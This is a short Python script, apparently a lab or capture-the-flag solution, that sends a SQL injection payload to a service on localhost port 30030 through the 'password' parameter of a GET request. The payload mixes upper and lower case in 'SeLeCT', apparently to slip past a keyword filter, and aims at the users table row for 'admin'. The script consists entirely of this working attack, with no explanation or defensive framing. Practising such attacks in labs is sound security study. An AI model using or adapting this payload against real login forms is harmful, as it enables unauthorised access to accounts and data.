import requests

url = "http://127.0.0.1:30030"
data = {
    "password":"asdf' SeLeCT * FROM users WHERE username='admin"
}
response = requests.get(url=url, params=data)
print(response.text)